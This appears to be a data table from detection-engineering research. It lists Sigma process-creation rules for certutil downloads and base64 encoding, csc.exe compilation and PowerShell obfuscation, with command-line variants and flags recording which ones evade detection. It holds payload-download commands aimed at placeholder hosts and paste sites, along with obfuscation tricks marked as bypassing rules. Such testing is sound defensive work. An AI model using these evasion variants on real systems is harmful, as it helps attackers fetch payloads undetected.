Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" -SPLIT -F http://0xC0000201/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" -""split"" -f http://0xC0000201/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		certutil.exe -urlcache -SPliT -f http://0xC0000201/example.txt C:\ emp\example.txt	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -""urlcache"" -""split"" /""f"" http://0xC0000201/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" -SpLIT -f http://0xC0000201/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" -split -f http://0xC0000201/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -urlcache -split -f http://testuser@192.0.2.1/example.txt C:\	emp\example.txt"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" /""split"" -F http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -""urlcache"" -SpLIt -f http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -urlcache -split /""f"" http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" -""split"" -f http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" /""split"" -""f"" http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -URLCAchE -split /""f"" http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -urlCACHE /""split"" -F http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -UrLcACHE /""split"" -""f"" http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe -""urlcache"" /""split"" -F http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_direct_ip	Suspicious File Downloaded From Direct IP Via Certutil.EXE	13e6fe51-d478-4c7e-b0f2-6da9b400a829		"certutil.exe /""urlcache"" /""split"" -f http://testuser@192.0.2.1/example.txt C:\ emp\example.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"" -split -f https://pastebin.com/raw/example123 C:\	emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"" -SPLiT -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"""" -split -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-uRLcAchE"" /""split"" -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-URLcAcHe"" -""split"" -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-uRlCacHe"" -split -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"" -split /""f"" https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"""" /""split"" -""f"" https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"" -SPLIT -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-Urlcache"" -sPLiT -""f"" https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe ""-urlcache"""" /""split"" -f https://pastebin.com/raw/example123 C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe -urlcache -split -f https://rentry.co/example123/raw C:\	emp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe -URlcACHE -""split"" -f https://rentry.co/example123/raw C:\ emp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe -urlcache -split -""f"" https://rentry.co/example123/raw C:\ emp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe -""urlcache"" -split -f https://rentry.co/example123/raw C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		certutil.exe -urlcache -split -f https://rentry.co/example123/raw C:\ emp\payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		certutil.exe -urLcAChE -sPLIT -f https://rentry.co/example123/raw C:\ emp\payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		certutil.exe -urlcache -splIt -f https://rentry.co/example123/raw C:\ emp\payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe -urLcAChe /""split"" -f https://rentry.co/example123/raw C:\ emp\payload.exe"	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
t1027	proc_creation_win_certutil_download_file_sharing_domains	Suspicious File Downloaded From File-Sharing Website Via Certutil.EXE	42a5f1e7-9603-4f6d-97ae-3f37d130d794		"certutil.exe -""urlcache"" -sPlIt -F https://rentry.co/example123/raw C:\ emp\payload.exe"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a		"certutil.exe -""encodehex"" input.txt output.txt 1"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a		"certutil.exe /""e^ncode"" input.txt output.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a		"certutil.exe -""e^ncode"" input.txt output.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a	certutil.exe  /ENcode input.txt output.txt	certutil.exe /E^Ncode input.txt output.txt	TRUE	FALSE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a	certutil.exe  /enCode input.txt output.txt	certutil.exe /e^nCode input.txt output.txt	TRUE	FALSE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode	File Encoded To Base64 Via Certutil.EXE	e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a	certutil.exe  /eNcODE input.txt output.txt	certutil.exe /e^NcODE input.txt output.txt	TRUE	FALSE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		certutil.exe -encode payload.bin encoded_payload.txt	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		"certutil.exe -""encode"" payload.bin encoded_payload.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		certutil.exe -EncodE payload.bin encoded_payload.txt	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		certutil.exe -encODe payload.bin encoded_payload.txt	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		"certutil.exe /""encode"" payload.bin encoded_payload.txt"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		certutil.exe -eNCOde payload.bin encoded_payload.txt	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		certutil.exe -eNCoDE payload.bin encoded_payload.txt	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_extensions	Suspicious File Encoded To Base64 Via Certutil.EXE	ea0cdc3e-2239-4f26-a947-4e8f8224e464		certutil.exe -ENcODE payload.bin encoded_payload.txt	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		cd C:\Windows\Temp && certutil.exe -encode payload.exe payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		"cd C:\Windows\Temp && certutil.exe -""encode"" payload.exe payload.b64"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		cd C:\Windows\Temp && certutil.exe -eNCOde payload.exe payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		"cd C:\Windows\Temp && certutil.exe /""encode"" payload.exe payload.b64"	FALSE	FALSE	FALSE	
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		"certutil.exe -""encode"" ""C:\Users\Public\"" payload.exe ""C:\Users\Public\"" payload.b64"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		"certutil.exe /""encode"" ""C:\Users\Public\"" payload.exe ""C:\Users\Public\"" payload.b64"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		certutil.exe -encode C:\ProgramData\payload.exe C:\ProgramData\payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		certutil.exe -eNCode C:\ProgramData\payload.exe C:\ProgramData\payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		"certutil.exe /""encode"" C:\ProgramData\payload.exe C:\ProgramData\payload.b64"	TRUE	TRUE	TRUE	
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		certutil.exe -enCODe C:\ProgramData\payload.exe C:\ProgramData\payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		certutil.exe -eNcOde C:\ProgramData\payload.exe C:\ProgramData\payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_certutil_encode_susp_location	File In Suspicious Location Encoded To Base64 Via Certutil.EXE	82a6714f-4899-4f16-9c1e-9a333544d4c3		certutil.exe -EnCoDe C:\ProgramData\payload.exe C:\ProgramData\payload.b64	TRUE	TRUE	FALSE	File Encoded To Base64 Via Certutil.EXE (e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a)
t1027	proc_creation_win_susp_cli_obfuscation_unicode_img	Potential CommandLine Obfuscation Using Unicode Characters From Suspicious Image	584bca0f-3608-4402-80fd-4075ff6072e3		"cmd.exe /c ""w^h^o^a^m^i"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_susp_cli_obfuscation_unicode_img	Potential CommandLine Obfuscation Using Unicode Characters From Suspicious Image	584bca0f-3608-4402-80fd-4075ff6072e3		"cmd.exe /C ""w^h^o^a^m^i"""	FALSE	FALSE	FALSE	
t1027	proc_creation_win_susp_cli_obfuscation_unicode_img	Potential CommandLine Obfuscation Using Unicode Characters From Suspicious Image	584bca0f-3608-4402-80fd-4075ff6072e3		"cmd.exe -""c"" ""w^h^o^a^m^i"""	TRUE	TRUE	TRUE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe /target:library /out:C:\Windows\Temp\payload.dll C:\Windows\Temp\payload.cs	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe -""target:library"" /out:C:\Windows\Temp\payload.dll C:\Windows\Temp\payload.cs"	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe /""target:library"" /ouT:c:\wIndows\TeMP\PaylOaD.dLL C:\Windows\Temp\payload.cs"	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe /tArGEt:LibrarY -""out:C:\Windows\Temp\payload.dll"" C:\Windows\Temp\payload.cs"	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe /taRGeT:LIbrarY -""out:C:\Windows\Temp\payload.dll"" C:\Windows\Temp\payload.cs"	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe -""target:library"" -""out:C:\Windows\Temp\payload.dll"" C:\Windows\Temp\payload.cs"	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\Windows\Temp\compiler.exe && C:\Windows\Temp\compiler.exe /tARGeT:liBRarY /OUT:c:\Windows\TEmp\PaYLoad.DLL C:\Windows\Temp\payload.cs	TRUE	TRUE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee)
t1059.001	proc_creation_win_hktl_crackmapexec_powershell_obfuscation	HackTool - CrackMapExec PowerShell Obfuscation	6f8b3439-a203-45dc-a88b-abf57ea15ccf		"powershell.exe -Command ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1059.001	proc_creation_win_hktl_crackmapexec_powershell_obfuscation	HackTool - CrackMapExec PowerShell Obfuscation	6f8b3439-a203-45dc-a88b-abf57ea15ccf		"powershell.exe /""Command"" ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_hktl_crackmapexec_powershell_obfuscation	HackTool - CrackMapExec PowerShell Obfuscation	6f8b3439-a203-45dc-a88b-abf57ea15ccf		"powershell.exe -""Command"" ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_hktl_crackmapexec_powershell_obfuscation	HackTool - CrackMapExec PowerShell Obfuscation	6f8b3439-a203-45dc-a88b-abf57ea15ccf		"powershell.exe -c ""$a = 'j'; $b = 'o'; $c = 'i'; $d = 'n'; $e = 's'; $f = 'p'; $g = 'l'; $h = 'i'; $i = 't'; $cmd = $a+$b+$c+$d+' '+$e+$f+$g+$h+$i; Invoke-Expression ('Write-Host ' + $cmd)"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
